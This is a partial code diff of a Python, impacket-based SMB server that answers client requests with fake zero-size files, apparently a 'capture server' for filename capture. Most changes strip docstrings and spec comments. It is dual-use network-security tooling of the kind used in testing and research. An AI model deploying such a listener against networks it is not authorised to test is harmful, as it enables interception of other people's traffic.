-            # [MS-FSCC] §2.4.7: FILE_BASIC_INFORMATION
             info = smb2.FILE_BASIC_INFORMATION()
             info["CreationTime"] = now
             info["LastAccessTime"] = now
@@ -2289,10 +1714,6 @@ class SMBHandler(BaseProtoHandler):
             output_data = info.getData()
 
         elif file_info_class == smb2.SMB2_FILE_ALL_INFO:
-            # [MS-FSCC] §2.4.2: FILE_ALL_INFORMATION (composite)
-            # Built from individual sub-structures because impacket's
-            # composite FILE_ALL_INFORMATION fails to serialize when
-            # sub-structure fields default to None.
             basic = smb2.FILE_BASIC_INFORMATION()
             basic["CreationTime"] = now
             basic["LastAccessTime"] = now
@@ -2354,12 +1775,6 @@ class SMBHandler(BaseProtoHandler):
         self.send_smb2_command(resp.getData(), packet)
 
     def handle_smb2_read(self, packet: smb2.SMB2Packet) -> None:
-        """SMB2 READ handler -- [MS-SMB2] §3.3.5.12.
-
-        Returns ``STATUS_END_OF_FILE`` for all read requests.  The fake
-        files created by :meth:`handle_smb2_create` have zero size, so
-        any read attempt hits EOF immediately.
-        """
         try:
             req = smb2.SMB2Read(packet["Data"])
             file_id = smb2.SMB2_FILEID(req["FileID"].getData())
@@ -2375,23 +1790,11 @@ class SMBHandler(BaseProtoHandler):
         self._smb2_error_response(packet, nt_errors.STATUS_END_OF_FILE)
 
     def handle_smb2_close(self, packet: smb2.SMB2Packet) -> None:
-        """SMB2 CLOSE handler -- [MS-SMB2] §3.3.5.10.
-
-        Acknowledges close requests with a spec-compliant CLOSE response.
-        Per [MS-SMB2] §2.2.16, StructureSize MUST be 0x3C (60).
-        """
         self.logger.debug("SMB2_CLOSE", is_client=True)
-        # SMB2Close_Response has all zeros for timestamps/sizes - spec-compliant
         resp = smb2.SMB2Close_Response()
         self.send_smb2_command(resp.getData(), packet)
 
     def handle_smb2_write(self, packet: smb2.SMB2Packet) -> None:
-        """SMB2 WRITE handler -- [MS-SMB2] §3.3.5.13.
-
-        Acknowledges write requests.  No data is actually written - the
-        fake files are read-only scaffolding.  Returns the requested
-        byte count as ``Count`` so the client believes the write succeeded.
-        """
         count = 0
         try:
             req = smb2.SMB2Write(packet["Data"])
@@ -2406,33 +1809,16 @@ class SMBHandler(BaseProtoHandler):
         self.send_smb2_command(resp.getData(), packet)
 
     def handle_smb2_flush(self, packet: smb2.SMB2Packet) -> None:
-        """SMB2 FLUSH handler -- [MS-SMB2] §3.3.5.11.
-
-        Acknowledges flush requests.  No data is actually flushed - the
-        fake files have no backing store.  Observed from Win8.1 and
-        Srv2012R2 (SMB 3.0.2 IS_GUEST clients) after WRITE operations.
-        """
         self.logger.debug("SMB2_FLUSH", is_client=True)
         resp = smb2.SMB2Flush_Response()
         self.send_smb2_command(resp.getData(), packet)
 
     def handle_smb2_lock(self, packet: smb2.SMB2Packet) -> None:
-        """SMB2 LOCK handler -- [MS-SMB2] §3.3.5.14.
-
-        Acknowledges lock requests.  Response is 4 bytes
-        (StructureSize + Reserved).
-        """
         self.logger.debug("SMB2_LOCK", is_client=True)
         resp = smb2.SMB2Lock_Response()
         self.send_smb2_command(resp.getData(), packet)
 
     def handle_smb2_set_info(self, packet: smb2.SMB2Packet) -> None:
-        """SMB2 SET_INFO handler -- [MS-SMB2] §3.3.5.21.
-
-        Acknowledges set-info requests.  No attributes are actually
-        changed - the fake files are immutable scaffolding.  Response
-        is 2 bytes (StructureSize only).
-        """
         try:
             req = smb2.SMB2SetInfo(packet["Data"])
             self.logger.debug(
@@ -2447,13 +1833,6 @@ class SMBHandler(BaseProtoHandler):
         self.send_smb2_command(resp.getData(), packet)
 
     def handle_smb1_nt_create(self, packet: smb.NewSMBPacket) -> None:
-        """SMB1 NT_CREATE_ANDX handler -- [MS-SMB] §3.3.5.6.
-
-        Returns a fake FID with ``STATUS_SUCCESS`` so the client proceeds
-        to READ_ANDX, allowing filename capture.  Empty filenames (share
-        root opens) get ``FILE_ATTRIBUTE_DIRECTORY``; all others get
-        ``FILE_ATTRIBUTE_NORMAL``.
-        """
         name = ""
         try:
             cmd = smb.SMBCommand(packet["Data"][0])
@@ -2462,10 +1841,7 @@ class SMBHandler(BaseProtoHandler):
             raw_data: bytes = cmd["Data"]
             is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
 
-            # [MS-SMB] §2.2.4.64.1: Unicode filenames have a 1-byte
-            # alignment pad before the filename.
             if is_unicode:
-                # Pad byte at offset 0 to align FileName to word boundary
                 start = 1
                 end = min(start + file_name_length, len(raw_data))
                 name = (
@@ -2497,7 +1873,6 @@ class SMBHandler(BaseProtoHandler):
         resp_params["LastAccessTime"] = now
         resp_params["LastWriteTime"] = now
         resp_params["LastChangeTime"] = now
-        # [MS-FSCC] §2.6: DIRECTORY (0x10) or ARCHIVE (0x20) per real Windows
         resp_params["FileAttributes"] = 0x10 if is_dir else 0x20
         resp_params["AllocationSize"] = 0
         resp_params["EndOfFile"] = 0
@@ -2525,13 +1900,6 @@ class SMBHandler(BaseProtoHandler):
         trans_data: bytes = b"",
         error_code: int | None = None,
     ) -> None:
-        """Build and send a TRANS2 response with correct offset layout.
-
-        The TRANS2 response embeds sub-parameters and sub-data inside the
-        SMB data section with absolute offsets from the SMB header start.
-        Layout: SMBheader(32) + WordCount(1) + Words(20) + ByteCount(2)
-        = 55 bytes fixed.  Pad1(1) aligns trans_parameters to offset 56.
-        """
         # Absolute offsets from SMB header start
         # 32(hdr) + 1(WC) + 20(Words) + 2(BC) = 55
         pad1 = b"\x00"  # align to even offset (55 -> 56)
@@ -2568,63 +1936,33 @@ class SMBHandler(BaseProtoHandler):
         )
 
     def _build_trans2_file_info(self, info_level: int) -> bytes | None:  # noqa: PLR0911
-        """Build TRANS2 file information data for a given information level.
-
-        Supports three encoding schemes observed from real Windows clients:
-
-        1. **CIFS-native levels** (0x0001-0x0002, 0x0100-0x010b): defined in
-           [MS-CIFS] section 2.2.8.3.  Used by NT 4.0 and as fallback.
-        2. **NT pass-through levels** (0x03E8+): ``FileInformationClass + 0x03E8``
-           per [MS-SMB] section 2.2.2.3.5.  Used by XP/Srv2003 when
-           ``CAP_INFOLEVEL_PASSTHRU`` is negotiated.
-        3. **Raw FileInformationClass** (small numbers 3-38): observed from
-           XP SP3 in pcap -- sends the class number directly without the
-           0x03E8 base.  Handled by the same native-class dispatch.
-        """
         now = get_server_time()
 
-        # Pass-through base per [MS-SMB] §2.2.2.3.5
         PASS_THROUGH_BASE = 0x03E8
 
-        # Normalise pass-through levels to native NT info class.
-        # Raw FileInformationClass values (< 0x03E8) pass through unchanged,
-        # which is correct - XP SP3 sends them without the 0x03E8 base.
         native = info_level
         if info_level >= PASS_THROUGH_BASE:
             native = info_level - PASS_THROUGH_BASE
 
-        # ── CIFS-native levels ([MS-CIFS] §2.2.8.3) ──────────────────────
-
-        # SMB_INFO_STANDARD (0x0001/0x0100) - NT 4.0
-        # [MS-CIFS] §2.2.8.3.1: 3×(Date+Time) + DataSize + AllocationSize + Attributes
+        # SMB_INFO_STANDARD (0x0001/0x0100)
         if info_level in {0x0001, 0x0100}:
             return b"\x00" * 22
 
-        # SMB_INFO_QUERY_EA_SIZE (0x0002/0x0200) - NT 4.0 EA query
+        # SMB_INFO_QUERY_EA_SIZE (0x0002/0x0200)
         if info_level in {0x0002, 0x0200}:
             return b"\x00" * 26  # 22 (standard) + 4 (EaSize)
 
-        # SMB_INFO_QUERY_EAS_FROM_LIST (0x0003) - Srv2003
-        # [MS-CIFS] §2.2.8.3.3: return empty EA list (4-byte size = 0)
+        # SMB_INFO_QUERY_EAS_FROM_LIST (0x0003)
         if info_level == 0x0003:
             return b"\x00" * 4
 
-        # 0x0006: dual meaning depending on TRANS2 subcommand:
-        #   QUERY_PATH_INFORMATION: SMB_INFO_IS_NAME_VALID - empty SUCCESS
-        #   QUERY_FILE_INFORMATION: FileInternalInformation (class 6) - 8-byte file ID
-        # Since both return SUCCESS and the 8-byte response is a superset of
-        # the empty response, always return 8 bytes.  [MS-FSCC] §2.4.20.
         if info_level == 0x0006:
             return b"\x00" * 8
 
-        # SMB_QUERY_FILE_EA_INFO (0x0103) / FileEaInformation (class 7)
-        # [MS-FSCC] §2.4.12: EaSize(4) - no EAs on fake files
+        # SMB_QUERY_FILE_EA_INFO (0x0103)
         if native == 7 or info_level == 0x0103:
             return b"\x00" * 4
 
-        # SMB_QUERY_FILE_ALL_INFO (0x0107) / FileAllInformation (class 15/0x0f)
-        # [MS-CIFS] §2.2.8.3.8 / [MS-FSCC] §2.4.2: composite of sub-structures.
-        # Built from individual pieces (same as SMB2 QUERY_INFO FileAllInfo).
         if native == 15 or info_level == 0x0107:
             basic = smb.SMBQueryFileBasicInfo()
             basic["CreationTime"] = now
@@ -2638,20 +1976,12 @@ class SMBHandler(BaseProtoHandler):
             std["NumberOfLinks"] = 1
             std["DeletePending"] = 0
             std["Directory"] = 0
-            # EaSize(4) + AccessFlags(4) + Position(8) + Mode(4) + Alignment(4)
-            # + FileNameLength(4) + FileName(0)
             tail = b"\x00" * (4 + 4 + 8 + 4 + 4 + 4)
             return basic.getData() + std.getData() + b"\x00" * 8 + tail
 
-        # SMB_QUERY_FILE_COMPRESSION (0x010b) / FileCompressionInformation (class 30/0x1e)
-        # [MS-FSCC] §2.4.9: CompressedFileSize(8) + CompressionFormat(2) +
-        # CompressionUnitShift(1) + ChunkShift(1) + ClusterShift(1) + Reserved(3)
         if native == 30 or info_level == 0x010B:
             return b"\x00" * 16
 
-        # ── NT FileInformationClass (pass-through or raw) ────────────────
-
-        # FileBasicInformation (class 4) / SMB_QUERY_FILE_BASIC_INFO (0x0101)
         if native == 4 or info_level == smb.SMB_QUERY_FILE_BASIC_INFO:
             file_info = smb.SMBQueryFileBasicInfo()
             file_info["CreationTime"] = now
@@ -2661,7 +1991,6 @@ class SMBHandler(BaseProtoHandler):
             file_info["ExtFileAttributes"] = smb2.FILE_ATTRIBUTE_ARCHIVE
             return file_info.getData()
 
-        # FileStandardInformation (class 5) / SMB_QUERY_FILE_STANDARD_INFO (0x0102)
         if native == 5 or info_level == smb.SMB_QUERY_FILE_STANDARD_INFO:
             file_info = smb.SMBQueryFileStandardInfo()
             file_info["AllocationSize"] = 0
@@ -2671,9 +2000,6 @@ class SMBHandler(BaseProtoHandler):
             file_info["Directory"] = 0
             return file_info.getData()
 
-        # FileNetworkOpenInformation (class 34/0x22 or raw 0x0026=38)
-        # [MS-FSCC] §2.4.29: 4×FILETIME + sizes + attributes (56 bytes)
-        # Note: 0x0026 = 38 decimal - observed from XP SP3 as raw class.
         if native in {34, 38}:
             info = smb.SMBFileNetworkOpenInfo()
             info["CreationTime"] = now
@@ -2687,52 +2013,34 @@ class SMBHandler(BaseProtoHandler):
 
         # Zero-filled responses grouped by size:
         #
-        #   8 bytes: FileInternalInformation (6)     [MS-FSCC] §2.4.20: IndexNumber
-        #            FilePositionInformation (11)     [MS-FSCC] §2.4.32: CurrentByteOffset
-        #            FileAllocationInformation (16)   [MS-FSCC] §2.4.4: AllocationSize
-        #            FilePipeInformation (23)         [MS-FSCC] §2.4.31: ReadMode+CompletionMode
+        #   8 bytes: FileInternalInformation (6)
+        #            FilePositionInformation (11)
+        #            FileAllocationInformation (16)
+        #            FilePipeInformation (23)
         if native in {6, 11, 16, 23}:
             return b"\x00" * 8
 
-        #  12 bytes: FileNamesInformation (12)        [MS-FSCC] §2.4.28: NextOffset+Index+NameLen
-        #            FilePipeRemoteInformation (25)   [MS-FSCC] §2.4.31: CollectTime+MaxCount
+        #  12 bytes: FileNamesInformation (12)
+        #            FilePipeRemoteInformation (25)
         if native in {12, 25}:
             return b"\x00" * 12
 
-        #   4 bytes: FileModeInformation (13)         [MS-FSCC] §2.4.26: Mode
-        #            FileAlignmentInformation (14)    [MS-FSCC] §2.4.3: AlignmentRequirement
-        #            FileMailslotQueryInformation (26) - minimal response (XP SP3)
+        #   4 bytes: FileModeInformation (13)
+        #            FileAlignmentInformation (14)
+        #            FileMailslotQueryInformation (26)
         if native in {13, 14, 26}:
             return b"\x00" * 4
 
-        #  36 bytes: FilePipeLocalInformation (24)    [MS-FSCC] §2.4.30: 9 × ULONG
+        #  36 bytes: FilePipeLocalInformation (24)
         if native == 24:
             return b"\x00" * 36
 
-        # ── Samba Unix extensions ─────────────────────────────────────────
-
-        # SMB_QUERY_FILE_UNIX_BASIC (0x0120)
-        # Samba extension - smbclient sends this before READ on NT1.
         if info_level == 0x0120:
             return b"\x00" * 100
 
         return None
 
     def handle_smb1_trans2(self, packet: smb.NewSMBPacket) -> None:
-        """SMB1 TRANSACTION2 handler -- [MS-CIFS] §3.3.5.34.
-
-        Dispatches TRANS2 subcommands:
-
-        - ``TRANS2_QUERY_PATH_INFORMATION`` (0x0005): returns
-          ``STATUS_SUCCESS`` with ``SMBQueryFileBasicInfo`` (directory
-          attributes + timestamps) so SMB1 clients proceed to
-          NT_CREATE_ANDX.
-        - ``TRANS2_QUERY_FILE_INFORMATION`` (0x0007): returns file
-          metadata by FID.  XP/Srv2003 send pass-through level
-          ``0x03ed`` (FileStandardInformation) after NT_CREATE_ANDX.
-        - ``TRANS2_FIND_FIRST2`` (0x0001): ``STATUS_NO_MORE_FILES``
-        - Others: ``STATUS_NOT_IMPLEMENTED``
-        """
         subcommand = -1
         try:
             cmd = smb.SMBCommand(packet["Data"][0])
@@ -2747,9 +2055,6 @@ class SMBHandler(BaseProtoHandler):
             self.logger.debug("SMB_COM_TRANSACTION2 (malformed)", is_client=True)
 
         if subcommand == smb.SMB.TRANS2_QUERY_PATH_INFORMATION:
-            # [MS-CIFS] §2.2.6.6.2: return basic file info so the client
-            # proceeds to NT_CREATE_ANDX.  EaErrorOffset=0 as parameter,
-            # SMBQueryFileBasicInfo (40 bytes) as data.
             now = get_server_time()
             file_info = smb.SMBQueryFileBasicInfo()
             file_info["CreationTime"] = now
@@ -2766,17 +2071,9 @@ class SMBHandler(BaseProtoHandler):
                 trans_data=file_info.getData(),
             )
         elif subcommand == smb.SMB.TRANS2_QUERY_FILE_INFORMATION:
-            # [MS-CIFS] §2.2.6.8: TRANS2_QUERY_FILE_INFORMATION
             # Request parameters: FID(2) + InformationLevel(2)
-            # XP/Srv2003 send pass-through level 0x03ed (FileStandardInfo).
             info_level = 0
             try:
-                # [MS-CIFS] §2.2.6.8.1: TRANS2_QUERY_FILE_INFORMATION
-                # Trans2_Parameters: FID(2) + InformationLevel(2)
-                # In the raw SMB data, sub-parameters start after Pad1.
-                # ParameterOffset (from trans2_params) gives the absolute
-                # offset from the SMB header start.  Relative to cmd["Data"]:
-                # Pad1(1) + sub-parameters start at offset 1.
                 raw_data: bytes = cmd["Data"]
                 # Pad1 is 1 byte, then FID(2) + InformationLevel(2)
                 if len(raw_data) >= 5:
@@ -2812,9 +2109,6 @@ class SMBHandler(BaseProtoHandler):
                     error_code=nt_errors.STATUS_NOT_SUPPORTED,
                 )
         elif subcommand == smb.SMB.TRANS2_QUERY_FS_INFORMATION:
-            # [MS-CIFS] §2.2.6.4: NT 4.0 queries filesystem info after
-            # tree connect.  Return empty success - the info level doesn't
-            # matter for a capture server; the client proceeds regardless.
             self.logger.debug("TRANS2_QUERY_FS_INFORMATION", is_client=True)
             self._send_smb1_trans2_response(
                 packet,
@@ -2836,11 +2130,6 @@ class SMBHandler(BaseProtoHandler):
             )
 
     def handle_smb1_read(self, packet: smb.NewSMBPacket) -> None:
-        """SMB1 READ_ANDX handler -- [MS-CIFS] §3.3.5.38.
-
-        Returns ``STATUS_END_OF_FILE`` for all read requests.  The fake
-        files have zero size, so any read hits EOF immediately.
-        """
         try:
             cmd = smb.SMBCommand(packet["Data"][0])
             params = smb.SMBReadAndX_Parameters(cmd["Parameters"])
@@ -2861,12 +2150,6 @@ class SMBHandler(BaseProtoHandler):
         )
 
     def handle_smb1_close(self, packet: smb.NewSMBPacket) -> None:
-        """SMB1 CLOSE handler -- [MS-CIFS] §3.3.5.27.
-
-        Acknowledges close requests.  ``SMB_COM_CLOSE`` is NOT an AndX
-        command - the response has zero parameter words and zero data
-        bytes.
-        """
         try:
             cmd = smb.SMBCommand(packet["Data"][0])
             params = smb.SMBClose_Parameters(cmd["Parameters"])
@@ -2882,13 +2165,6 @@ class SMBHandler(BaseProtoHandler):
 
 
 class SMBServer(ThreadingTCPServer):
-    """Threaded TCP server that spawns an :class:`SMBHandler` per connection.
-
-    Generates a stable 16-byte ``ServerGuid`` per [MS-SMB2] §2.2.4 that
-    persists for the lifetime of this server instance (shared across all
-    connections handled by this listener).
-    """
-
     default_handler_class = SMBHandler
     default_port = 445
 
@@ -2899,25 +2175,14 @@ class SMBServer(ThreadingTCPServer):
         server_address: tuple[str, int] | None = None,
         RequestHandlerClass: type | None = None,
     ) -> None:
-        """Initialize the SMB TCP server with a stable ServerGuid.
-
-        Generates a random 16-byte ServerGuid per [MS-SMB2] §2.2.4 that
-        persists for the lifetime of this server instance. Delegates to
-        :class:`ThreadingTCPServer` for socket binding and thread management.
-        """
         self.server_config = server_config
-        # Stable ServerGuid per server instance - [MS-SMB2] §2.2.4
+        # Stable ServerGuid per server instance
         self.server_guid: bytes = secrets.token_bytes(16)
         super().__init__(config, server_address, RequestHandlerClass)
 
     def finish_request(
         self, request: typing.Any, client_address: tuple[str, int]
     ) -> None:
-        """Instantiate the handler class to process a single client connection.
-
-        Overrides :meth:`ThreadingTCPServer.finish_request` to pass the
-        additional ``server_config`` argument required by :class:`SMBHandler`.
-        """
-        typing.cast("type", self.RequestHandlerClass)(
+        self.RequestHandlerClass(
             self.config, self.server_config, request, client_address, self
         )
